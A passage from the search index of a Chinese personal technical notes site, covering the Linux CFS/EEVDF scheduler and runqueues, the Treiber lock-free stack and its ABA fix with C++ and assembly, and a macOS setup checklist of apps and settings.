\u200b\u65f6\u95f4\u200b\u5c31\u8981\u200b\u83b7\u5f97\u200b r \u200b\u7684\u200b CPU \u200b\u65f6\u95f4\u200b\u3002\u200b\u7528\u200b CFS \u200b\u7684\u8bdd\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u6743\u91cd\u200b\u5360\u200b\u6240\u6709\u200b\u4efb\u52a1\u200b\u7684\u200b \\(r/T\\)\uff0c\u200b\u8bb0\u200b\u4e3a\u200b f\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u53cd\u8fc7\u6765\u200b\uff0c\u200b\u5047\u5982\u200b\u6211\u200b\u77e5\u9053\u200b\u4e00\u4e2a\u200b\u4efb\u52a1\u200b\u7684\u200b\u6743\u91cd\u200b\u5360\u200b\u6bd4\u200b\u662f\u200b f\uff0c\u200b\u6211\u200b\u5e0c\u671b\u200b\u5b83\u200b\u5728\u200b\u4ec0\u4e48\u200b\u65f6\u523b\u200b\u4e4b\u524d\u200b\u5b8c\u6210\u200b\u5462\u200b\uff1f\u200b\u5047\u5982\u200b\u6211\u200b\u5728\u200b t \u200b\u65f6\u523b\u200b\u6536\u5230\u200b\u4e00\u5e27\u200b\uff0c\u200b\u6211\u200b\u5e0c\u671b\u200b\u4efb\u52a1\u200b\u5728\u200b\u4e0b\u200b\u4e00\u5e27\u200b\u4e4b\u524d\u200b\u5b8c\u6210\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u8981\u200b\u5728\u200b \\(t+T\\) \u200b\u65f6\u523b\u200b\u524d\u200b\u5b8c\u6210\u200b\u3002\u200b\u800c\u200b \\(f=r/T\\)\uff0c\u200b\u90a3\u4e48\u200b \\(T=r/f\\)\uff0c\u200b\u5e26\u5165\u200b \\(t+T\\)\uff0c\u200b\u5f97\u5230\u200b \\(t+\\frac{r}{f}\\)\u3002\u200b\u5b83\u200b\u8ba1\u7b97\u200b\u7684\u200b\u662f\u200b\uff1a\u200b\u5047\u5982\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u5b9a\u671f\u200b\u6267\u884c\u200b\u7684\u200b\u5b9e\u65f6\u200b\u4efb\u52a1\u200b\uff0c\u200b\u5b83\u200b\u5e94\u8be5\u200b\u5728\u200b\u4ec0\u4e48\u200b\u65f6\u523b\u200b\u4e4b\u524d\u200b\u5b8c\u6210\u200b\uff1f\u200b\u8fd9\u4e2a\u200b\u5f0f\u5b50\u200b\u5df2\u7ecf\u200b\u5f88\u200b\u63a5\u8fd1\u200b\u6700\u7ec8\u200b\u7684\u200b virtual deadline \u200b\u8ba1\u7b97\u65b9\u6cd5\u200b\u3002</p>"},{"location":"software/linux_scheduler.html#runqueue","title":"runqueue","text":"<p>runqueue \u200b\u662f\u200b Linux \u200b\u7684\u200b per cpu \u200b\u6570\u636e\u7ed3\u6784\u200b\uff0c\u200b\u7ef4\u62a4\u200b\u4e86\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u6838\u4e0a\u200b\u8981\u200b\u8fd0\u884c\u200b\u7684\u200b\u4efb\u52a1\u200b\u3002\u200b\u4e3a\u4e86\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\uff0c\u200b\u628a\u200b\u673a\u5668\u200b\u7684\u200b\u4e0d\u540c\u200b\u6838\u5fc3\u200b\u7528\u200b\u8d77\u6765\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u4e0d\u540c\u200b cpu \u200b\u7684\u200b runqueue \u200b\u4e4b\u95f4\u200b\u8fc1\u79fb\u200b\u4efb\u52a1\u200b\u3002\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u5408\u7406\u200b\u7684\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\uff0c\u200b\u8c03\u5ea6\u200b\u5668\u200b\u9700\u8981\u200b\u77e5\u9053\u200b\u5904\u7406\u5668\u200b\u7684\u200b\u62d3\u6251\u200b\uff0c\u200b\u8fd9\u662f\u200b\u901a\u8fc7\u200b Sched Domain \u200b\u6765\u200b\u8868\u793a\u200b\u7684\u200b\u3002</p> <p>Domain \u200b\u5448\u200b\u4e00\u4e2a\u200b\u6811\u578b\u200b\u7ed3\u6784\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u662f\u200b CPU \u200b\u6838\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5212\u5206\u200b\uff0c\u200b\u7236\u200b\u7ed3\u70b9\u200b\u662f\u5b50\u200b\u7ed3\u70b9\u200b\u7684\u200b\u8d85\u96c6\u200b\uff0c\u200b\u6bd4\u5982\u200b SMT \u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u7684\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b NUMA Node\uff0c\u200b\u6574\u4e2a\u200b Socket\uff0c\u200b\u6240\u6709\u200b\u6838\u200b\u3002\u200b\u901a\u8fc7\u200b\u8fd9\u4e2a\u200b\u6811\u578b\u200b\u7ed3\u6784\u200b\uff0c\u200b\u5185\u6838\u200b\u8c03\u5ea6\u200b\u5668\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b CPU \u200b\u6838\u5fc3\u200b\u7684\u200b\u62d3\u6251\u200b\u3002</p> <p>\u200b\u63a5\u7740\u200b\u662f\u200b\u5728\u200b\u8fd9\u68f5\u200b\u6811\u4e0a\u200b\u8fdb\u884c\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\u3002\u200b\u6bcf\u4e2a\u200b Domain \u200b\u53ef\u4ee5\u200b\u6709\u200b\u82e5\u5e72\u4e2a\u200b Group\uff0c\u200b\u6bcf\u4e2a\u200b Group \u200b\u8bb0\u5f55\u200b\u4e86\u200b\u82e5\u5e72\u4e2a\u200b CPU \u200b\u6838\u5fc3\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\u7684\u200b\u7c92\u5ea6\u200b\u5c31\u662f\u200b Group\uff0c\u200b\u4fdd\u8bc1\u200b\u540c\u4e00\u4e2a\u200b Domain \u200b\u4e0b\u200b\uff0c\u200b\u4e0d\u540c\u200b Group \u200b\u7684\u200b\u8d1f\u8f7d\u200b\u662f\u200b\u5dee\u4e0d\u591a\u200b\u7684\u200b\u3002Group \u200b\u7684\u200b\u8d1f\u8f7d\u200b\uff0c\u200b\u5c31\u662f\u200b\u8fd9\u4e2a\u200b Group \u200b\u5185\u200b\u6240\u6709\u200b\u6838\u200b\u7684\u200b\u8d1f\u8f7d\u200b\u4e4b\u200b\u548c\u200b\u3002</p> <p>Linux \u200b\u5185\u6838\u200b\u4f1a\u200b\u5b9a\u671f\u200b\u8fdb\u884c\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\uff0c\u200b\u68c0\u67e5\u200b Domain \u200b\u91cc\u9762\u200b\uff0c\u200b\u6709\u6ca1\u6709\u200b\u54ea\u4e2a\u200b Group \u200b\u8d1f\u8f7d\u200b\u6700\u9ad8\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\uff0c\u200b\u5c1d\u8bd5\u200b\u628a\u200b\u4efb\u52a1\u200b\u632a\u5230\u200b\u5176\u4ed6\u200b\u7684\u200b Group \u200b\u7684\u200b runqueue \u200b\u5185\u90e8\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5bf9\u4e8e\u200b SMT \u200b\u6765\u8bf4\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7269\u7406\u200b\u6838\u200b\u6210\u4e3a\u200b\u4e00\u4e2a\u200b Group\uff0cGroup \u200b\u5185\u200b\u5c31\u662f\u200b\u4e24\u4e2a\u200b\u903b\u8f91\u200b\u6838\u200b\u3002\u200b\u901a\u8fc7\u200b\u8d1f\u8f7d\u200b\u5747\u8861\u200b\uff0c\u200b\u5148\u7ed9\u200b\u6bcf\u4e2a\u200b Group \u200b\u7684\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u6838\u200b\u5206\u914d\u4efb\u52a1\u200b\uff0c\u200b\u5982\u679c\u200b\u6240\u6709\u200b Group \u200b\u90fd\u200b\u6709\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u518d\u200b\u5411\u200b SMT \u200b\u7684\u200b\u7b2c\u4e8c\u4e2a\u200b\u903b\u8f91\u200b\u6838\u4e0a\u200b\u5206\u914d\u4efb\u52a1\u200b\u3002</p>"},{"location":"software/linux_scheduler.html#_1","title":"\u53c2\u8003","text":"<ul> <li>Linux CFS \u200b\u8c03\u5ea6\u200b\u5668\u200b\uff1a\u200b\u539f\u7406\u200b\u3001\u200b\u8bbe\u8ba1\u200b\u4e0e\u200b\u5185\u6838\u200b\u5b9e\u73b0\u200b\uff082023\uff09</li> <li>EEVDF Patch Notes</li> <li>Linux \u200b\u5185\u6838\u200b\uff1aEEVDF \u200b\u8c03\u5ea6\u200b\u5668\u200b\u8be6\u89e3\u200b</li> <li>CFS \u200b\u7684\u200b\u8986\u706d\u200b\uff0cLinux \u200b\u65b0\u200b\u8c03\u5ea6\u200b\u5668\u200b EEVDF \u200b\u8be6\u89e3\u200b</li> </ul>"},{"location":"software/lock_free.html","title":"Lock Free \u200b\u6570\u636e\u7ed3\u6784","text":""},{"location":"software/lock_free.html#treiber-stack","title":"Treiber Stack","text":"<p>Treiber Stack \u200b\u662f\u200b\u4e00\u4e2a\u200b Lock-Free \u200b\u7684\u200b Stack\uff0c\u200b\u652f\u6301\u200b Push \u200b\u548c\u200b Pop \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u7531\u200b R. Kent Treiber \u200b\u5728\u200b 1986 \u200b\u5e74\u200b\u63d0\u51fa\u200b\uff0c\u200b\u51fa\u73b0\u200b\u5728\u200b Systems Programming: Coping With Parallelism \u200b\u7b2c\u200b 17 \u200b\u9875\u200b\u3002\u200b\u539f\u6587\u4e2d\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b\u7531\u200b\u6c47\u7f16\u200b\u7f16\u5199\u200b\u7684\u200b\uff1a</p> <p> </p> Treiber Stack\uff08\u200b\u56fe\u6e90\u200b Systems Programming: Coping With Parallelism Page 18\uff09 <p>\u200b\u7ffb\u8bd1\u6210\u200b C++ \u200b\u4ee3\u7801\u200b\uff0c\u200b\u5b83\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u5927\u6982\u200b\u662f\u200b\uff08\u200b\u53c2\u8003\u200b\u4e86\u200b cppreference\uff09\uff1a</p> <pre><code>#include &lt;atomic&gt;\n#include &lt;optional&gt;\n\ntemplate &lt;class T&gt; struct Node {\n  T data;        // user data\n  Node&lt;T&gt; *next; // pointer to next node\n\n  Node(const T &amp;data) : data(data), next(nullptr) {}\n};\n\ntemplate &lt;class T&gt; struct Stack {\n  // paper: ANCHOR\n  // head of singly linked list\n  std::atomic&lt;Node&lt;T&gt; *&gt; head;\n\n  Stack() : head(nullptr) {}\n\n  // paper: PUTEL\n  void push(const T &amp;data) {\n    Node&lt;T&gt; *new_head = new Node&lt;T&gt;(data);\n\n    // paper: L R2, ANCHOR\n    // read current head\n    Node&lt;T&gt; *cur_head = head.load(std::memory_order_relaxed);\n\n    // paper: ST R2, ELNEXT-EL(,R4)\n    // link the new list\n    new_head-&gt;next = cur_head;\n\n    // paper: CS R2, R4, ANCHOR; ST R2, ELNEXT-EL(,R4) on failure\n    // atomic swap if head == new_head-&gt;next\n    // on success: head becomes new_head\n    // on failure: new_head-&gt;next becomes the current value of head, and loop\n    // release order: ensure new_head-&gt;next = cur_head is observed before CAS\n    while (!head.compare_exchange_weak(new_head-&gt;next, new_head,\n                                       std::memory_order_release,\n                                       std::memory_order_relaxed))\n      ;\n  }\n\n  // paper: GETEL\n  std::optional&lt;T&gt; pop() {\n    Node&lt;T&gt; *cur_head;\n    // paper: L R2, ANCHOR\n    // read current head\n    cur_head = head.load(std::memory_order_relaxed);\n\n    // paper: LTR R2, R2; BZ EMPTY\n    while (cur_head) {\n      // paper: L R4, ELNEXT-EL(,R2)\n      // cur_head-&gt;next becomes the new list head\n      Node&lt;T&gt; *new_head = cur_head-&gt;next;\n\n      // paper: CS R2, R4, ANCHOR\n      // atomic swap if head == cur_head\n      // on success: head becomes new_head\n      // on failure: cur_head becomes the current value of head, and loop\n      // release order: ensure cur_head-&gt;data is done after CAS\n      if (head.compare_exchange_weak(cur_head, new_head,\n                                     std::memory_order_acquire,\n                                     std::memory_order_relaxed)) {\n        // success\n        T result = cur_head-&gt;data;\n        delete cur_head;\n        return result;\n      }\n    }\n\n    // no elements\n    return {};\n  }\n};\n</code></pre> <p>\u200b\u751f\u6210\u200b\u7684\u200b AMD64 \u200b\u6c47\u7f16\u200b\u6307\u4ee4\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>tack&lt;int&gt;::push(int const&amp;):\n        # function prologue\n        pushq   %rbp\n        movq    %rsi, %rbp\n        pushq   %rbx\n        # rbx = &amp;head\n        movq    %rdi, %rbx\n\n        # call operator new to allocate 16 bytes of memory\n        movl    $16, %edi\n        subq    $8, %rsp\n        call    operator new(unsigned long)\n        # new_head = new (16)\n        movq    %rax, %rdx\n        # eax = data\n        movl    0(%rbp), %eax\n        # new_head-&gt;next = nullptr\n        movq    $0, 8(%rdx)\n        leaq    8(%rdx), %rcx\n        # new_head-&gt;data = data\n        movl    %eax, (%rdx)\n        # cur_head = head.load()\n        movq    (%rbx), %rax\n        # new_head-&gt;next = cur_head\n        movq    %rax, 8(%rdx)\n.L8:\n        # rax = new_head-&gt;next\n        movq    (%rcx), %rax\n        # compare rax(new_head-&gt;next) and head\n        # if equal: head = new_head\n        # else: rax = head\n        lock cmpxchgq   %rdx, (%rbx)\n        # jump to .L9 if swapped\n        je      .L9\n        # new_head-&gt;next = rax\n        movq    %rax, (%rcx)\n        # try again\n        jmp     .L8\n.L9:\n        addq    $8, %rsp\n        popq    %rbx\n        popq    %rbp\n        ret\n\nStack&lt;int&gt;::pop():\n        subq    $40, %rsp\n        # cur_head = head.load()\n        movq    (%rdi), %rax\n.L12:\n        testq   %rax, %rax\n        # jump to .L22 if cur_head is null\n        je      .L22\n        # new_head = cur_head-&gt;next\n        movq    8(%rax), %rdx\n        # compare rax(cur_head) and head\n        # if equal: head = new_head\n        # else: rax = head\n        lock cmpxchgq   %rdx, (%rdi)\n        # jump to .L12 if not swapped\n        jne     .L12\n        # result = cur_head-&gt;data\n        movl    (%rax), %edx\n        testq   %rax, %rax\n        # jump to .L23 if cur_head != NULL\n        jne     .L23\n.L13:\n        movl    %edx, 24(%rsp)\n        movb    $1, 28(%rsp)\n.L14:\n        # return cur_head-&gt;data\n        movq    24(%rsp), %rax\n        addq    $40, %rsp\n        ret\n.L23:\n        movl    $16, %esi\n        movq    %rax, %rdi\n        movl    %edx, 12(%rsp)\n        # delete cur_head\n        call    operator delete(void*, unsigned long)\n        movl    12(%rsp), %edx\n        jmp     .L13\n.L22:\n        movq    $0, 24(%rsp)\n        jmp     .L14\n</code></pre> <p>\u200b\u53ef\u89c1\u200b\u6838\u5fc3\u200b\u5c31\u662f\u200b <code>lock cmpxchgq reg, mem</code> \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u8bed\u4e49\u200b\u662f\u200b\uff1a</p> <ul> <li>\u200b\u6bd4\u8f83\u200b mem \u200b\u6307\u5411\u200b\u7684\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u548c\u200b rax \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b</li> <li>\u200b\u5982\u679c\u200b\u76f8\u7b49\u200b\uff1aZF=1\uff0c\u200b\u628a\u200b reg \u200b\u7684\u200b\u503c\u200b\u5199\u5165\u200b\u5230\u200b mem \u200b\u6307\u5411\u200b\u7684\u200b\u5185\u5bb9\u200b</li> <li>\u200b\u5982\u679c\u200b\u4e0d\u200b\u76f8\u7b49\u200b\uff1aZF=0\uff0c\u200b\u628a\u200b mem \u200b\u6307\u5411\u200b\u7684\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u5199\u5165\u200b\u5230\u200b rax \u200b\u5bc4\u5b58\u5668\u200b</li> </ul> <p>\u200b\u5e76\u4e14\u200b\u6574\u4e2a\u200b\u8fc7\u7a0b\u200b\u662f\u200b\u539f\u5b50\u200b\u7684\u200b\u3002</p> <p>\u200b\u5728\u200b ARMv8.1-a \u200b\u4e0a\u200b\u7f16\u8bd1\u200b\uff0c\u200b\u5219\u200b\uff1a</p> <ul> <li>push \u200b\u4f1a\u200b\u7528\u200b CASL \u200b\u6307\u4ee4\u200b\u5b9e\u73b0\u200b release order \u200b\u7684\u200b 64-bit CAS</li> <li>pop \u200b\u4f1a\u200b\u7528\u200b CASA \u200b\u6307\u4ee4\u200b\u5b9e\u73b0\u200b acquire order \u200b\u7684\u200b 64-bit CAS</li> </ul> <p><code>CAS{A,L} Xs, Xt, [Xn|SP, #0]</code> \u200b\u7684\u200b\u8bed\u4e49\u200b\uff1a</p> <ul> <li>\u200b\u6bd4\u8f83\u200b [Xn|SP, #0] \u200b\u6307\u5411\u200b\u7684\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u548c\u200b Xs \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u503c\u200b</li> <li>\u200b\u5982\u679c\u200b\u76f8\u7b49\u200b\uff1a\u200b\u628a\u200b Xt \u200b\u7684\u200b\u503c\u200b\u5199\u5165\u200b\u5230\u200b [Xn|SP, #0] \u200b\u6307\u5411\u200b\u7684\u200b\u5185\u5bb9\u200b</li> <li>\u200b\u5982\u679c\u200b\u4e0d\u200b\u76f8\u7b49\u200b\uff1a\u200b\u628a\u200b [Xn|SP, #0] \u200b\u6307\u5411\u200b\u7684\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u5199\u5165\u200b\u5230\u200b Xs \u200b\u5bc4\u5b58\u5668\u200b</li> </ul> <p>\u200b\u4e3a\u4e86\u200b\u5224\u65ad\u200b\u662f\u5426\u200b\u4ea4\u6362\u200b\u6210\u529f\u200b\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b CMP \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5224\u65ad\u200b Xs \u200b\u5728\u200b\u6267\u884c\u200b CAS \u200b\u6307\u4ee4\u200b\u524d\u540e\u200b\u7684\u200b\u503c\u200b\u662f\u5426\u200b\u76f8\u540c\u200b\u3002</p>"},{"location":"software/lock_free.html#aba","title":"ABA \u200b\u95ee\u9898\u200b\u4ee5\u53ca\u200b\u89e3\u51b3\u200b\u65b9\u6cd5","text":"<p>\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\u5b9e\u73b0\u200b\u6709\u200b\u4e00\u4e2a\u200b ABA \u200b\u95ee\u9898\u200b\uff08ABA \u200b\u6307\u200b\u67d0\u4e2a\u200b\u503c\u200b\u4ece\u200b A \u200b\u6539\u6210\u200b B \u200b\u518d\u200b\u6539\u6210\u200b A\uff09\uff1aCAS \u200b\u662f\u200b\u6839\u636e\u200b\u6307\u9488\u200b\u7684\u200b\u503c\u6765\u200b\u5224\u65ad\u200b\u662f\u5426\u200b\u8981\u200b swap\uff0c\u200b\u4f46\u662f\u200b\u6307\u9488\u200b\u7684\u200b\u503c\u200b\u4e0d\u53d8\u200b\uff0c\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u6307\u9488\u200b\u6307\u5411\u200b\u7684\u200b\u8fd8\u662f\u200b\u540c\u4e00\u4e2a\u200b\u5bf9\u8c61\u200b\u3002\u200b\u4f8b\u5982\u200b head \u200b\u6307\u9488\u200b\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b ANCHOR\uff09\u200b\u6307\u5411\u200b\u7684\u200b node\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b A\uff09\u200b\u88ab\u200b pop \u200b\u6389\u200b\u4e86\u200b\uff0c\u200b\u672a\u6765\u200b\u53c8\u200b\u91cd\u65b0\u200b push\uff0cpush \u200b\u7684\u200b\u65f6\u5019\u200b\u6070\u597d\u200b <code>new</code> \u200b\u51fa\u6765\u200b\u4e86\u200b\u540c\u4e00\u4e2a\u200b\u6307\u9488\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5bfc\u81f4\u200b CAS \u200b\u5199\u5165\u200b next \u200b\u6307\u9488\u200b\u7684\u200b\u503c\u7528\u200b\u7684\u200b\u662f\u200b\u539f\u6765\u200b\u7684\u200b node\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b A\uff09\u200b\u7684\u200b next\uff08\u200b\u4e0b\u56fe\u200b\u7684\u200b B\uff09\uff0c\u200b\u4f46\u200b\u8fd9\u4e2a\u200b\u503c\u200b\u6b64\u65f6\u200b\u662f\u200b\u975e\u6cd5\u200b\u7684\u200b\uff1a</p> <p> </p> Treiber Stack \u200b\u7684\u200b ABA \u200b\u95ee\u9898\u200b\uff08\u200b\u56fe\u6e90\u200b Systems Programming: Coping With Parallelism Figure 10 on Page 19\uff09 <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u9700\u8981\u200b\u628a\u200b\u94fe\u8868\u200b\u5934\u200b\u6307\u9488\u200b\u548c\u200b\u4e00\u4e2a\u200b\u6574\u6570\u200b\u7ed1\u200b\u5728\u200b\u4e00\u8d77\u200b\uff0c\u200b\u4e8c\u8005\u200b\u540c\u65f6\u200b CAS\uff1a\u200b\u6bcf\u6b21\u200b\u66f4\u65b0\u200b\u6307\u9488\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u6574\u6570\u200b\u52a0\u4e00\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u533a\u5206\u200b\u51fa\u200b\u524d\u540e\u200b\u4e24\u4e2a\u200b A \u200b\u6307\u9488\u200b\u4e86\u200b\uff0c\u200b\u5373\u4f7f\u200b\u5b83\u4eec\u200b\u6307\u9488\u200b\u7684\u200b\u503c\u200b\u76f8\u540c\u200b\uff0c\u200b\u4f46\u662f\u200b\u6574\u6570\u200b\u4e0d\u540c\u200b\uff0c\u200b\u4f9d\u7136\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u533a\u5206\u200b\u3002\u200b\u8fd9\u200b\u9700\u8981\u200b\u786c\u4ef6\u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u901a\u5e38\u200b\u53eb\u505a\u200b Double-wide compare and swap\uff0c\u200b\u8be6\u89c1\u200b \u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u3002\u200b\u66f4\u65b0\u200b\u540e\u200b\u7684\u200b\u6c47\u7f16\u200b\u7248\u672c\u200b\uff1a</p> <p> </p> Treiber Stack \u200b\u4fee\u6b63\u200b ABA \u200b\u95ee\u9898\u200b\u7684\u200b\u7248\u672c\u200b\uff08\u200b\u56fe\u6e90\u200b Systems Programming: Coping With Parallelism Figure 11 on Page 20\uff09 <p>\u200b\u5bf9\u5e94\u200b\u7684\u200b C++ \u200b\u7248\u672c\u200b\uff1a</p> <pre><code>#include &lt;atomic&gt;\n#include &lt;optional&gt;\n\ntemplate &lt;class T&gt; struct Node {\n  T data;        // user data\n  Node&lt;T&gt; *next; // pointer to next node\n\n  Node(const T &amp;data) : data(data), next(nullptr) {}\n};\n\ntemplate &lt;class T&gt; struct HeadWithCounter {\n  // paper: ANCHORP\n  // head of singly linked list\n  Node&lt;T&gt; *head;\n  // paper: ANCHORC\n  // allocation counter\n  size_t counter;\n\n  HeadWithCounter() : head(nullptr), counter(0) {}\n};\n\ntemplate &lt;class T&gt; struct Stack {\n  // paper: ANCHOR\n  // head of singly linked list with counter\n  std::atomic&lt;HeadWithCounter&lt;T&gt;&gt; head;\n\n  Stack() : head(HeadWithCounter&lt;T&gt;()) {}\n\n  // paper: PUTEL\n  void push(const T &amp;data) {\n    HeadWithCounter&lt;T&gt; new_head;\n    new_head.head = new Node&lt;T&gt;(data);\n\n    // paper: L R2, ANCHORP\n    // read current head\n    // in paper, only head pointer is used for CAS;\n    // it is hard to do so with std::atomic\n    HeadWithCounter&lt;T&gt; cur_head = head.load(std::memory_order_relaxed);\n\n    do {\n      // paper: ST R2, ELNEXT-EL(,R4)\n      // link the new list\n      new_head.head-&gt;next = cur_head.head;\n      new_head.counter = cur_head.counter;\n\n      // paper: CS R2, R4, ANCHOR; ST R2, ELNEXT-EL(,R4) on failure\n      // atomic swap if head == cur_head\n      // on success: head becomes new_head\n      // on failure: cur_head becomes the current value of head, and loop\n      // release order: ensure write to new_head.head is observed before CAS\n    } while (!head.compare_exchange_weak(cur_head, new_head,\n                                         std::memory_order_release,\n                                         std::memory_order_relaxed));\n  }\n\n  // paper: GETEL\n  std::optional&lt;T&gt; pop() {\n    HeadWithCounter&lt;T&gt; cur_head;\n    // paper: LM R2, R3, ANCHOR\n    // read current head\n    cur_head = head.load(std::memory_order_relaxed);\n\n    // paper: LTR R2, R2; BZ EMPTY\n    while (cur_head.head) {\n      // paper: L R4, ELNEXT-EL(,R2)\n      // cur_head-&gt;next becomes the new list head\n      HeadWithCounter&lt;T&gt; new_head;\n      new_head.head = cur_head.head-&gt;next;\n\n      // paper: LA R5, 1; AR R5, R3\n      // update counter to handle ABA problem\n      new_head.counter = cur_head.counter + 1;\n\n      // paper: CDS R2, R4, ANCHOR\n      // atomic swap if head == cur_head\n      // on success: head becomes new_head\n      // on failure: cur_head becomes the current value of head, and loop\n      // release order: ensure cur_head-&gt;data is done after CAS\n      if (head.compare_exchange_weak(cur_head, new_head,\n                                     std::memory_order_acquire,\n                                     std::memory_order_relaxed)) {\n        // success\n        T result = cur_head.head-&gt;data;\n        delete cur_head.head;\n        return result;\n      }\n    }\n\n    // no elements\n    return {};\n  }\n};\n</code></pre> <p>\u200b\u5728\u200b Java \u200b\u8bed\u8a00\u200b\u7248\u672c\u200b\u7684\u200b Treiber Stack \u200b\u4e2d\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u6709\u200b ABA \u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u4e3a\u200b Java \u200b\u8fd0\u884c\u200b\u65f6\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\uff0cCAS \u200b\u7684\u200b\u65f6\u5019\u200b\u4e24\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b\u5bf9\u8c61\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u89c6\u4e3a\u200b\u76f8\u7b49\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1a</p> <ul> <li>Systems Programming: Coping With Parallelism</li> <li>Treiber stack</li> </ul>"},{"location":"software/macos.html","title":"macOS Goodies","text":"<p>Apps:</p> <ul> <li>Alfred, launch on login</li> <li>Rectangle, launch on login, use Spectacle key bindings, change Repeated commands -&gt; cycle sizes on half actions</li> <li>iStat Menus, launch on login</li> <li>Firefox, pin to Dock</li> <li>Thunderbird, pin to Dock, click top-right button and change ui density and font size in the menu</li> <li>Visual Studio Code, pin to Dock</li> <li>WeChat, pin to Dock</li> <li>iTerm, pin to Dock</li> <li>Squirrel Rime</li> <li>1Password</li> <li>Homebrew with TUNA Mirrors</li> <li>Nix home-manager, Setup trusted users: <code>echo \"trusted-users = $USER\" &gt;&gt; /etc/nix/nix.conf &amp;&amp; sudo launchctl unload /Library/LaunchDaemons/org.nixos.nix-daemon.plist &amp;&amp; sudo launchctl load /Library/LaunchDaemons/org.nixos.nix-daemon.plist</code></li> <li>Rustup &amp; Crates.io with TUNA Mirrors</li> <li>Windows App</li> <li>Tencent Meeting</li> <li>MikTeX</li> <li>Skim</li> <li>\u200b\u8292\u679c\u200b TV</li> <li>NetNewsWire</li> <li>TimeMachine logging: <code>log stream --style syslog  --predicate 'senderImagePath contains[cd] \"TimeMachine\"' --info</code></li> <li>Rosetta 2: <code>softwareupdate --install-rosetta --agree-to-license</code></li> <li>Ghidra: <code>xattr -dr com.apple.quarantine /opt/homebrew/Caskroom/ghidra</code></li> <li>Image Capture: access photos from iOS or HarmonyOS NEXT via USB</li> </ul> <p>Configs:</p> <ul> <li><code>defaults write -g ApplePressAndHoldEnabled -bool false</code> for press and hold</li> <li>Settings -&gt; Control Center -&gt; Battery -&gt; Show in Control Center -&gt; Disabled</li> <li>Settings -&gt; Control Center -&gt; Menu Bar Only -&gt; Spotlight -&gt; Don't Show in Menu Bar -&gt; Siri -&gt; Don't Show in Menu Bar</li> <li>Settings -&gt; Trackpad -&gt; Look up &amp; data detectors -&gt; Tap with Three Fingers</li> <li>Settings -&gt; Trackpad -&gt; Tap to click -&gt; Enabled</li> <li>Settings -&gt; Accessibility -&gt; Pointer Control -&gt; Trackpad Options -&gt; Use trackpad for dragging -&gt; Enabled -&gt; Dragging style -&gt; Three Finger Drag</li> <li>Settings -&gt; Keyboard -&gt; Keyboard Shortcuts... -&gt; Modifier Keys -&gt; Caps Lock key -&gt; Escape</li> <li>Settings -&gt; Desktop &amp; Dock -&gt; Hot Corners... -&gt; Bottom Right -&gt; Lock Screen -&gt; Bottom Left -&gt; Mission Control</li> <li>Settings -&gt; Keyboard -&gt; Text Input -&gt; Edit... -&gt; Add period with double-space -&gt; Off -&gt; Done</li> <li><code>sudo scutil --set HostName newhostname</code></li> <li>Disk Utility -&gt; Volume + -&gt; Name: Data -&gt; Add</li> 